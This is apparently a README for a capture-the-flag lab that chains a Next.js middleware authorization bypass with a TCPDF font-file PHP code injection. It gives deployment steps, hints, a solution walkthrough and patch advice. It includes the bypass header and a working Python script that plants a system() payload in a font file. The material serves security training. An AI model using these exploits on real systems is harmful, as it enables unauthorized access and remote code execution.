# CTF Challenge: MiddleChain
**專案文件：** [HackMD 完整報告](https://hackmd.io/HIGiiXpqQJypf1Dil_prgQ)
> **CVE-2025-29927** (Next.js Middleware Authorization Bypass) → **CVE-2024-56520** (TCPDF PHP Code Injection via Malicious Font File)

## 題目故事

你是一名滲透測試員，目標是一套內部文件管理系統 **NexDocs**。
前端使用 Next.js，後端有一個 PHP PDF 生成服務。
系統聲稱有完整的身份驗證機制，但真的是這樣嗎？

**目標：取得兩個 FLAG**

---

## 環境架構

```
[攻擊者]
    │
    ▼ port 3000
┌──────────────────┐
│  Next.js 14.2.24  │  ← CVE-2025-29927 漏洞點
│  (Frontend + API) │
└────────┬─────────┘
         │ 內網 http://php-pdf:8080
         ▼
┌──────────────────┐
│  PHP 8.1         │  ← CVE-2024-56520 漏洞點
│  TCPDF 6.7.5     │
└──────────────────┘
```

> PHP 服務不對外暴露，只有透過 Next.js API route 才能存取。

---

## 快速部署

### 需求

- Docker >= 20.10
- Docker Compose >= 2.0

### 環境變數設定

複製 `.env.example` 為 `.env`，填入以下內容：

```bash
cp .env.example .env
```

`.env` 內容：

```
JWT_SECRET=supersecretkey_ctf_2026
FLAG1=FLAG{1_middleware_is_not_enough_4a8f2c}
FLAG2=FLAG{2_tcpdf_code_injection_pwned_7f3a9c}
```

### 啟動

```bash
unzip ctf-challenge.zip
cd ctf-challenge
docker compose up --build
```

訪問：`http://localhost:3000`

### 內網連線（多人環境）

若要讓同區網其他裝置（如 Kali Linux）連線到靶機，需要在 Windows 防火牆新增入站規則：

```powershell
# 以系統管理員身分執行
netsh advfirewall firewall add rule name="CTF Port 3000" dir=in action=allow protocol=TCP localport=3000
```

其他裝置使用 `http://192.168.X.X:3000` 連線（X 依實際 IP 而定）。

### 停止

```bash
docker compose down
```

---

## FLAG 位置

| Flag | 取得方式 | 對應漏洞 |
|------|---------|----------|
| FLAG 1 | Bypass auth 後在 Admin Dashboard 頁面的 Deployment Notes 區塊 | CVE-2025-29927 |
| FLAG 2 | 上傳惡意字體觸發 RCE，FLAG 出現在生成的 PDF 裡 | CVE-2024-56520 |

---

## 解題提示（Hint）

<details>
<summary>Hint 1 — 偵察</summary>

從 `/guest` 開始，F12 觀察 HTML 的 meta tag。
嘗試登入 `/login`，帳號密碼從哪裡來？
仔細看 `/login` 失敗時的 response 每個欄位。
`/api/password-policy` 的 response 值得多讀幾遍。

</details>

<details>
<summary>Hint 2 — FLAG 1 解法</summary>

CVE-2025-29927：在 HTTP request 加入以下 header 即可跳過 Next.js middleware：

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

用 Burp Suite 的 Match and Replace 讓瀏覽器每個 request 自動帶上這個 header，然後直接訪問 `/admin`。

</details>

<details>
<summary>Hint 3 — FLAG 2 偵察</summary>

進入 Admin 後，注意 Font Management 的上傳功能。
下載生成的 PDF，用文字編輯器開啟搜尋 `Producer`，可以找到 PDF 引擎的版本資訊。
思考：如果能上傳惡意字體，會發生什麼？

</details>

<details>
<summary>Hint 4 — FLAG 2 解法</summary>

1. 取得真實的 Type1 `.pfb` 字體（例如從 [tc-font-pdfa](https://github.com/tecnickcom/tc-font-pdfa) 下載 PDFACourier.pfb）
2. 用 Python 修改 `FontBBox` 欄位，注入 PHP payload，**記得更新 Segment 1 的 length**：

```python
from struct import unpack, pack

with open("PDFACourier.pfb", "rb") as f:
    content = f.read()

php_payload = b"1 2 3 4'.system('cat /flag.txt').'"

bbox_start = content.index(b"/FontBBox {") + 11
bbox_end = content.index(b"}", bbox_start)
original_bbox = content[bbox_start:bbox_end]

seg1_size = unpack("<I", content[2:6])[0]
new_seg1_size = seg1_size + len(php_payload) - len(original_bbox)

modified = (
    content[0:2] +
    pack("<I", new_seg1_size) +
    content[6:bbox_start] +
    php_payload +
    content[bbox_end:]
)

with open("evil_font.pfb", "wb") as f:
    f.write(modified)
```

3. 用 API Key 上傳惡意字體到 Admin
4. 在 Guest 頁面選擇該字體，Generate PDF
5. FLAG 出現在 PDF 內容裡

</details>

---

## 完整解題流程

### Step 1：線索鏈 → 取得 API Key

```
/guest → F12 發現 cache-ref meta tag
    ↓
base64 decode → user:nxadmin / pass:nexd0cs_t3st
    ↓
/login 輸入帳號密碼 → 503 + see_policy: /api/password-policy
    ↓
/api/password-policy
  → session_key: "mistletoe"（Internal Chatroom 密碼）
  → hint: RnJyIG55ZmI6IC9lYm9iZ2YuZ2tn（ROT13+Base64 編碼）
    ↓
Base64 decode → ROT13 decode → See also: /robots.txt
    ↓
訪問 /robots.txt（取得 robots_seen cookie）→ 發現 /internal/chat
    ↓
/internal/chat → 輸入 mistletoe → 取得 chat_access cookie → 進入 Secret Santa 聊天室
    ↓
alice 不小心貼出 API Key: NxDocs-4dm1n-K3y-2026-f7a3c9e2
```

### Step 2：CVE-2025-29927 → FLAG 1

```
Burp Suite Match and Replace 加入 header:
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
    ↓
瀏覽器訪問 /admin → 成功進入 Admin Dashboard
    ↓
Deployment Notes 區塊找到 FLAG 1 ✓
```

### Step 3：CVE-2024-56520 → FLAG 2

```
下載任意生成的 PDF → 文字編輯器搜尋 Producer → 發現 TCPDF 6.7.5
    ↓
Google 搜尋 "TCPDF 6.7.5 CVE" → 找到 CVE-2024-56520
    ↓
下載 PDFACourier.pfb → Python 修改 FontBBox 注入 PHP payload
    ↓
Admin 新增 API Key → 上傳 evil_font.pfb
    ↓
Guest 選擇惡意字體 → Generate PDF
    ↓
TCPDF addTTFfont() 解析字體 → FontBBox 值寫入 .php 字體定義檔
setFont() include → 執行 system('cat /flag.txt')
    ↓
FLAG 出現在 PDF 裡 → FLAG 2 ✓
```

---

## 反爆破設計

本題刻意設計多層保護，防止玩家靠工具硬掃跳過線索鏈：

| 保護機制 | 說明 |
|---------|------|
| `robots_seen` cookie | 必須先訪問 `/robots.txt` 取得 cookie，才能進入 `/internal/chat`；直接訪問或 ffuf 掃到回 404 |
| `chat_access` cookie | 必須在 chatroom 輸入正確密碼，才能訪問 `/secret-santa`；直接訪問回 404 |
| Login 帳密雙重驗證 | 帳號 + 密碼都要正確才回傳 `see_policy` hint，防止帳號枚舉攻擊 |
| API Key 格式驗證 | 前端只驗格式不驗正確性，不在原始碼暴露正確 Key，防止原始碼洩漏答案 |

---

## 漏洞原理

### CVE-2025-29927 — Next.js Middleware Authorization Bypass

Next.js 用 `x-middleware-subrequest` header 防止 middleware 無限遞迴呼叫。
此 header 的值基於 middleware 路徑，具有可預測性，攻擊者偽造後 Next.js 會跳過所有 middleware 執行，導致任何依賴 middleware 保護的路由全部失效。

- **影響版本**：Next.js < 14.2.25
- **CVSS**：9.1 (Critical)
- **參考**：https://nextjs.org/blog/cve-2025-29927

### CVE-2024-56520 — TCPDF PHP Code Injection via Malicious Font File

TCPDF 的 `addTTFfont()` 將 Type1 `.pfb` 字體轉換成 PHP 字體定義檔時，未對 `FontBBox` 屬性的值做任何驗證，直接將其字串寫入 `.php` 檔案。當 `setFont()` include 這個 `.php` 時，注入的 PHP code 就會被執行，造成任意程式碼執行（RCE）。

- **影響版本**：TCPDF < 6.8.0
- **CVSS**：7.3 (High)
- **參考**：https://d3adend.org/blog/posts/tcpdf-multiple-vulnerabilities/

---

## 修補方式

### CVE-2025-29927
升級 Next.js 至 14.2.25+。
不要只靠 middleware 做授權，API route 層也需要加入驗證。
可在 reverse proxy 層過濾 `x-middleware-subrequest` header。

### CVE-2024-56520
升級 TCPDF 至 6.8.0+。
對 `FontBBox` 屬性值做嚴格的整數型別驗證，不允許任何非數字字元。

---

## 檔案結構

```
ctf-challenge/
├── docker-compose.yml
├── README.md
├── nextjs-app/
│   ├── middleware.js                      ← CVE-2025-29927 漏洞點 + cookie 保護邏輯
│   ├── components/
│   │   ├── GuestClient.js                ← Guest 頁面主元件
│   │   └── ThemeProvider.js
│   └── app/
│       ├── guest/page.js                 ← 入口
│       ├── login/page.js                 ← 登入頁（帳密都對才給 policy hint）
│       ├── admin/page.js                 ← FLAG 1 所在 + API Key 管理 + Font Management
│       ├── secret-santa/page.js          ← API Key 洩漏點（需要 chat_access cookie）
│       ├── internal/chat/page.js         ← 需要 session_key + robots_seen cookie
│       ├── backup/config.bak/route.js    ← 誤導用敏感資訊
│       ├── robots.txt/route.js           ← 設定 robots_seen cookie
│       └── api/
│           ├── login/route.js            ← 帳密驗證 + 503 + see_policy
│           ├── password-policy/route.js  ← session_key + ROT13+Base64 hint
│           ├── fonts/route.js            ← 字體列表
│           ├── upload-font/route.js      ← 需要 API Key + magic bytes + SHA-256 驗證
│           ├── delete-font/route.js      ← 需要 API Key
│           └── generate-pdf/route.js    ← 轉送到 PHP
└── php-pdf/
    ├── composer.json                      ← 鎖定 TCPDF 6.7.5
    ├── generate.php                       ← CVE-2024-56520 漏洞點
    ├── upload-font.php                    ← 字體上傳（副檔名 + magic bytes 驗證）
    ├── delete-font.php                    ← 字體刪除
    └── fonts.php                          ← 字體列表（含 SHA-256 hash）
```
